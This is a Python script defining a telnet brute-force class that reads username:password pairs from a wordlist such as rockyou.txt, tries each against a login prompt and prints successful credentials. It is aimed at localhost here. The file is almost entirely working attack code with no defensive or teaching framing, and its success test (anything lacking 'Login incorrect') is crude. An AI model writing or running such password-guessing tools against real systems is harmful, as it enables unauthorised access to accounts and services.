import telnetlib
import socket
import time


class BruteForcer:
    def __init__(self, host, port, protocol, wordlist_path):
        self.host = host
        self.port = port
        self.protocol = protocol
        self.wordlist_path = wordlist_path

    def brute_force(self):
        if self.protocol.lower() == "telnet":
            self.brute_force_telnet()
        else:
            print(f"Protocol {self.protocol} is not supported yet.")

    def brute_force_telnet(self):
        try:
            with open(self.wordlist_path, 'r', encoding='latin-1') as file:
                credentials = [line.strip().split(':') for line in file]

            for username, password in credentials:
                if self.try_telnet_login(username, password):
                    print(f"Success: {username}:{password}")
                    return (username, password)
                else:
                    print(f"Failed: {username}:{password}")
            print("Brute force attempt finished without success.")
        except UnicodeDecodeError as e:
            print(f"Error reading wordlist file: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
        return None

    def try_telnet_login(self, username, password):
        try:
            tn = telnetlib.Telnet(self.host, self.port, timeout=10)
            tn.read_until(b"login: ")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(password.encode('ascii') + b"\n")

            time.sleep(1)
            response = tn.read_very_eager().decode('ascii')

            if "Login incorrect" not in response:
                return True
        except socket.timeout:
            print(f"Connection to {self.host}:{self.port} timed out.")
        except Exception as e:
            print(f"An error occurred: {e}")
        return False

bruter = BruteForcer("127.0.0.1", 23, "telnet", "rockyou.txt")
bruter.brute_force()


'''
infile = open('rockyou.txt', 'r', encoding='latin-1')
lines = infile.readlines()  
res = []

for line in lines:
    res.append(line.strip())
    #print(line.strip())  
print(res[820])
infile.close()
'''

